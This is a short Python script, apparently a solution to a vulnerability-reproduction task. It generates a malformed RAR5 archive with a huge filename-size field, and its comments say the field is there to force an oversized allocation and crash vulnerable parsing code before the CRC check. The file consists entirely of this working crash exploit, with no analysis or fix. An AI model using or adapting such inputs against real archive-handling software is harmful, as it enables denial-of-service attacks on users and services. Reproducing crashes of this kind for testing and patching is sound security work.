import os
import io
import tarfile
import zlib


def _vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint requires non-negative integer")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _crc32_le(data: bytes) -> bytes:
    return (zlib.crc32(data) & 0xFFFFFFFF).to_bytes(4, "little")


class Solution:
    def solve(self, src_path: str) -> bytes:
        sig = b"Rar!\x1a\x07\x01\x00"

        # MAIN_HEAD block: type=1, flags=0, main_flags=0
        main_hdr = _vint(1) + _vint(0) + _vint(0)
        main_payload = _vint(len(main_hdr)) + main_hdr
        main_block = _crc32_le(main_payload) + main_payload

        # FILE_HEAD block (intentionally truncated after NameSize field):
        # Use extremely large name size to trigger allocation in vulnerable code.
        name_size = (1 << 62) + 0x1234

        # Header layout (common + file header fields):
        # type=2, hdr_flags=0x02 (HAS_DATA), data_size=0,
        # file_flags=0, unpacked_size=0, attributes=0,
        # comp_info=0, host_os=0, name_size=HUGE
        file_hdr_prefix = (
            _vint(2) +
            _vint(2) +
            _vint(0) +
            _vint(0) +
            _vint(0) +
            _vint(0) +
            _vint(0) +
            _vint(0) +
            _vint(name_size)
        )

        # Full header size is expected to include the filename bytes, which are absent here.
        file_header_size = len(file_hdr_prefix) + name_size
        file_payload = _vint(file_header_size) + file_hdr_prefix

        # CRC is not computed correctly (would require absent bytes); crash should occur before CRC check.
        file_block = b"\x00\x00\x00\x00" + file_payload

        return sig + main_block + file_block